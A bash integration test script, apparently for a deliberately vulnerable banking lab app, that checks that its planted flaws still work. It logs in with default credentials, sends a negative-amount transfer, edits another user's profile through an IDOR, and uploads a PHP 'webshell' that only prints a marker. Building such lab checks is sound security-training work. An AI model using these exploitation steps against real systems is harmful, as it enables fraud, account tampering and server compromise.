#!/usr/bin/env bash
set -euo pipefail

FRONTEND_URL="${FRONTEND_URL:-http://localhost:8080}"
LOGIN_USERNAME="${LOGIN_USERNAME:-j.doe}"
LOGIN_PASSWORD="${LOGIN_PASSWORD:-password}"
TRANSFER_SENDER="${TRANSFER_SENDER:-DE12345123451234512345}"
TRANSFER_RECIPIENT="${TRANSFER_RECIPIENT:-DE00000111112222233333}"
NEGATIVE_AMOUNT="${NEGATIVE_AMOUNT:--10}"
IDOR_TARGET_ID="${IDOR_TARGET_ID:-2}"
IDOR_FIRSTNAME="${IDOR_FIRSTNAME:-Jack}"
IDOR_LASTNAME="${IDOR_LASTNAME:-Adams}"
IDOR_PHONE="${IDOR_PHONE:-15550002}"
IDOR_EMAIL="${IDOR_EMAIL:-j.adams.idor@example.test}"
IDOR_BIRTHDATE="${IDOR_BIRTHDATE:-1990-05-05}"
IDOR_ABOUT="${IDOR_ABOUT:-changed-by-msa-integration-test}"
UPLOAD_TARGET_ID="${UPLOAD_TARGET_ID:-1}"
WEBSHELL_FILENAME="${WEBSHELL_FILENAME:-msa-webshell.php}"
WEBSHELL_MARKER="${WEBSHELL_MARKER:-VULNBANK_MSA_WEBSHELL_OK}"

WORK_DIR="$(mktemp -d)"
trap 'rm -rf "${WORK_DIR}"' EXIT

require_tool() {
  local name="$1"
  if ! command -v "${name}" >/dev/null 2>&1; then
    echo "ERROR: required tool is missing: ${name}" >&2
    exit 1
  fi
}

json_value() {
  local file="$1"
  local key="$2"
  python3 - "${file}" "${key}" <<'PY'
import json
import sys

path = sys.argv[1]
key = sys.argv[2]
with open(path, "r", encoding="utf-8") as fh:
    raw = fh.read()
try:
    data = json.loads(raw)
except Exception:
    sys.exit(0)
value = data
for part in key.split("."):
    if isinstance(value, dict) and part in value:
        value = value[part]
    else:
        sys.exit(0)
if value is None:
    sys.exit(0)
print(value)
PY
}

assert_http_success() {
  local name="$1"
  local code="$2"
  local body="$3"
  case "${code}" in
    2*|3*)
      echo "PASS: ${name} returned HTTP ${code}" >&2
      ;;
    *)
      echo "ERROR: ${name} returned HTTP ${code}" >&2
      echo "Response body:" >&2
      sed -n '1,200p' "${body}" >&2
      exit 1
      ;;
  esac
}

curl_form() {
  local name="$1"
  local path="$2"
  local body_file="${WORK_DIR}/${name}.json"
  local header_file="${WORK_DIR}/${name}.headers"
  shift 2
  local code
  code="$(
    curl -sS \
      -D "${header_file}" \
      -o "${body_file}" \
      -w "%{http_code}" \
      -X POST \
      "$@" \
      "${FRONTEND_URL}${path}"
  )"
  assert_http_success "${name}" "${code}" "${body_file}"
  echo "${body_file}"
}

curl_get() {
  local name="$1"
  local path="$2"
  local body_file="${WORK_DIR}/${name}.body"
  local header_file="${WORK_DIR}/${name}.headers"
  local code
  code="$(
    curl -sS \
      -D "${header_file}" \
      -o "${body_file}" \
      -w "%{http_code}" \
      "${FRONTEND_URL}${path}"
  )"
  assert_http_success "${name}" "${code}" "${body_file}"
  echo "${body_file}"
}

require_tool curl
require_tool python3
require_tool awk
require_tool sed

echo "MSA integration target: ${FRONTEND_URL}"

login_body="$(
  curl_form "login" "/api/v1/auth/login" \
    --data-urlencode "username=${LOGIN_USERNAME}" \
    --data-urlencode "password=${LOGIN_PASSWORD}"
)"
token="$(json_value "${login_body}" "token")"
if [[ -z "${token}" ]]; then
  echo "ERROR: login succeeded but token was not found in JSON" >&2
  sed -n '1,200p' "${login_body}" >&2
  exit 1
fi
echo "PASS: token extracted (len=${#token})"

transfer_body="$(
  curl_form "negative-transfer" "/api/v1/transactions/transfer" \
    -H "Authorization: Bearer ${token}" \
    --data-urlencode "sender=${TRANSFER_SENDER}" \
    --data-urlencode "recipient=${TRANSFER_RECIPIENT}" \
    --data-urlencode "amount=${NEGATIVE_AMOUNT}" \
    --data-urlencode "comment=negative-transfer-integration-test"
)"
transfer_status="$(json_value "${transfer_body}" "status")"
if [[ "${transfer_status}" != "success" ]]; then
  echo "ERROR: negative transfer response was not success" >&2
  sed -n '1,200p' "${transfer_body}" >&2
  exit 1
fi
echo "PASS: negative transfer request accepted"

idor_body="$(
  curl_form "idor-user-update" "/api/v1/settings/infoupdate" \
    -H "Authorization: Bearer ${token}" \
    --data-urlencode "id=${IDOR_TARGET_ID}" \
    --data-urlencode "firstname=${IDOR_FIRSTNAME}" \
    --data-urlencode "lastname=${IDOR_LASTNAME}" \
    --data-urlencode "phone=${IDOR_PHONE}" \
    --data-urlencode "email=${IDOR_EMAIL}" \
    --data-urlencode "birthdate=${IDOR_BIRTHDATE}" \
    --data-urlencode "about=${IDOR_ABOUT}"
)"
idor_status="$(json_value "${idor_body}" "status")"
if [[ "${idor_status}" != "success" ]]; then
  echo "ERROR: IDOR user update response was not success" >&2
  sed -n '1,200p' "${idor_body}" >&2
  exit 1
fi
echo "PASS: IDOR user update request accepted for user id ${IDOR_TARGET_ID}"

webshell_file="${WORK_DIR}/${WEBSHELL_FILENAME}"
printf '%s\n' "<?php echo '${WEBSHELL_MARKER}'; ?>" > "${webshell_file}"
upload_body="${WORK_DIR}/webshell-upload.json"
upload_headers="${WORK_DIR}/webshell-upload.headers"
upload_code="$(
  curl -sS \
    -D "${upload_headers}" \
    -o "${upload_body}" \
    -w "%{http_code}" \
    -X POST \
    -H "Authorization: Bearer ${token}" \
    -F "id=${UPLOAD_TARGET_ID}" \
    -F "upload_avatar=@${webshell_file};filename=${WEBSHELL_FILENAME};type=application/x-php" \
    "${FRONTEND_URL}/api/v1/files/upload"
)"
assert_http_success "webshell-upload" "${upload_code}" "${upload_body}"
upload_status="$(json_value "${upload_body}" "status")"
uploaded_source="$(json_value "${upload_body}" "source")"
if [[ "${upload_status}" != "success" || -z "${uploaded_source}" ]]; then
  echo "ERROR: upload response did not include a successful source path" >&2
  sed -n '1,200p' "${upload_body}" >&2
  exit 1
fi
echo "PASS: PHP upload request accepted: ${uploaded_source}"

uploaded_path="/vulnbank/online/${uploaded_source}"
uploaded_body="$(curl_get "webshell-fetch" "${uploaded_path}")"
if ! grep -q "${WEBSHELL_MARKER}" "${uploaded_body}"; then
  echo "ERROR: uploaded PHP file did not return expected marker through frontend gateway" >&2
  sed -n '1,200p' "${uploaded_body}" >&2
  exit 1
fi
echo "PASS: uploaded PHP file executed through frontend gateway"

echo "MSA integration test completed successfully"
